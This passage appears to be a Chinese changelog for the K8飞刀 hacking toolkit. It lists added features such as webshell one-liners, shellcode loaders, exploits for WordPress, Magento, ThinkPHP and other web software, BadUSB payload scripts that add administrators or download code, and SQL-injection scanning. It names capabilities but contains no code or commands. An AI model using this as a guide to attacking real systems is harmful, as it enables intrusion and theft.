20150828<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话文件重命名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150828<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 修复 中文文件名读取&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150827<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 支持Linux系统服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150826<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 服务器文件下载到本地&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 本地文件上传到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 下载URL文件到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 删除目标服务器文件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Lnx-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Win-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 列目录(显示直观大小)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150821<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--ASCII码-多格式ASCII码转字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent WebShell(新型一句话木马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150813<br>=================================================================================<br>K8飞刀 20150725<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制跳转URL,允许用户选择是否更新&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150725<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 腾达无线路由器(Tenda 11N)登陆密码绕过&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150724<br>[+]SysSeting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持SOCKS5代理设置(配合Htran内网渗透)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150723<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--存活WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--掉线WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--全部WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>=================================================================================<br>K8飞刀 20150720&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellCode Loader<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ShellCode Loader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--HexString2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2HexString&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>=================================================================================<br>K8飞刀 20150713&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking Team Flash0day ShellCode Exploit<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150708<br>=================================================================================<br>K8飞刀 20150705<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--新型Cookie一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150705<br>[+]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FastStart(右键菜单快速启动CMD &amp; K8飞刀)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--DeDeCMS管理员密码加密解密算法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150701<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unix时间戳格式与时间互转 获取当前时间戳&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150629<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 浏览器模式 修复Cookier伪造欺骗无效的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628<br>=================================================================================<br>K8飞刀 20150628<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 黑客浏览器伪造IP(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20150628<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--非数字非字母PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64编码--PHP反解Base64代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150624<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--路径转义 \转\\ \\转\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新IIS ASPX PHP IP小图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 世界第一电子商务系统 Magento 1.7.0.2 漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150615<br>=================================================================================<br>K8飞刀 20150610<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 批量删除掉线WebShell(使用前先检测存活状态)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--VBS转Teensy脚本支持&amp;符号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--选中内容 CMD运行/Bat运行/VBS运行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150609<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Perl一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用CFM一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Python一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和$post)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和分号)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Acunetix WVS &lt;=9.5 全版本远程代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150603<br>=================================================================================<br>K8飞刀 20150601<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导入TXT格式WebShell(格式:Shell地址 空格 密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--导入URL(所有文本文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--抓取的URL自动进行URL解码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量检测URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量处理URL--保留结尾目录&nbsp;&nbsp;&nbsp;&nbsp; 20150531<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式自动检测当前页面所有URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150531<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式--浏览网站自动记录Banner/IP/地理等信息&nbsp;&nbsp;&nbsp; 20150530<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Unicode2Ansi &amp; Ansi2Unicode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150530<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 藏文乱码(首先系统要安装藏文) 很多站用UTF8就搞定&nbsp;&nbsp; 20150529<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增欧美系统编码ISO-8859-1(西藏文字)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150529<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相关功能模块选中项进行高亮显示&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150528<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WP用户采集(WP3.41 WP3.52 WP3.61 WP3.81 WP3.88)&nbsp;&nbsp;&nbsp; 20150527<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress用户采集(WP4.10 WP4.12 WP4.21 WP4.2b3)&nbsp;&nbsp; 20150526<br>=================================================================================<br>K8飞刀 20150520<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 网站子域名扫描/二级域名扫描(渗透大型站点必备)&nbsp;&nbsp;&nbsp;&nbsp; 20150520<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一键生成EXP功能 调式好的EXP可直接生成EXE工具&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150519<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键菜单添加生成EXP功能 可直接生成EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150518<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键调整(相关功能转Hacking) 新增域名解析功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150517<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--加载搜索语法\批量处理URL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150516<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Web提交-PHP/Python/Perl/Flash/jQuery脚本完善&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善相关脚本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WEB提交参数中出现邮箱可能会导致CSRF失败&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elfinder &lt;=2.0 rc1 文件上传漏洞 GetShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150512<br>=================================================================================<br>K8飞刀 20150511<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制自动更新...仅在标题和弹框提示最新版&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150511<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善对笔记本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150504<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其它功能 指定长度字符串生成(比如WP 64K XSS)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(双引号 #号 :号 /号 -号)互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(单引号 逗号 分号 点号) 互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>=================================================================================<br>K8飞刀 20150425 WP漏洞专版<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress photo-uploader 1.8&nbsp;&nbsp;&nbsp;&nbsp; PHP文件上传漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Simple Ads Manager 2.5.96&nbsp; SQL注入漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Business Intelligence&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Security &amp; Firewall 3.9 SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Ajax Store Locator 1.2&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress sp-client-document-manager SQL注入漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Tune Library 1.5.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress MiwoFTP &lt;= 1.0.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件下载漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress NEX-Forms 3.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Magento Server MAGMI&nbsp; 插件本地包含漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;= 2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;=3.1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞利用EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress Mobile Edition 2.7 文件读取EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150422<br>K8飞刀 20150418<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.2.2 (TinyMCE) SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.1.2 Remote Code Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.4.1 LFI 0day Exploit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>=================================================================================<br>K8飞刀 20150412 BadUSB专版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 过UAC执行任意脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义BAT脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义VBS脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 添加管理员开启3389&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本(VBS转BAT脚本 VBS转CMD命令渗透常用)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 开启Telnet脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win-EN DNS修改脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 添加管理员脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150409<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy(Win&amp;Lnx)下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150406<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Linux&nbsp;&nbsp; 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150406<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Hacked by&nbsp; 装B脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150324<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Arduino 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150320<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 帝国备份王万能Cookie登陆后台Exp(需修改时间戳)&nbsp;&nbsp;&nbsp;&nbsp; 20150319<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ecshop管理员md5转成Cookie 可直接进入2.7.x后台&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz产品 SupeSite 6.x 7.x 